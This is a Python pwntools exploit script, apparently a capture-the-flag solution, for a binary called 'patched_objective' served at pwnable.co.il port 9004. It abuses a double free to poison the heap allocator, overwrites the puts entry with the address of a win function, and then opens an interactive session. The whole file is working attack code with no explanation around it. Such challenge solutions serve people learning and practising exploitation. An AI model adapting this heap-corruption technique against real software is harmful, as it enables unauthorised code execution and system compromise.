#!/usr/bin/env python3
from pwn import * 

context.binary = elf = ELF('./patched_objective')
libc = ELF('./libc.so.6')

if args['REMOTE']:
    io = remote('pwnable.co.il', 9004)
else: 
    io = process([elf.path])

def insert(data, type):
    global io
    
    io.sendline(b'1')
    io.sendline(str(type).encode())
    io.sendline(flat(data))

def free(index): 
    global io 
    
    io.sendline(b'3')
    io.sendline(str(index).encode())
    
padding = b'd' * 8 
puts_plt_address = 0x0404020
win_address = 0x0401296

insert(padding, 3)
free(0)
free(0)
insert(puts_plt_address, 3)
insert(padding, 3)
insert(win_address, 3)

io.interactive()
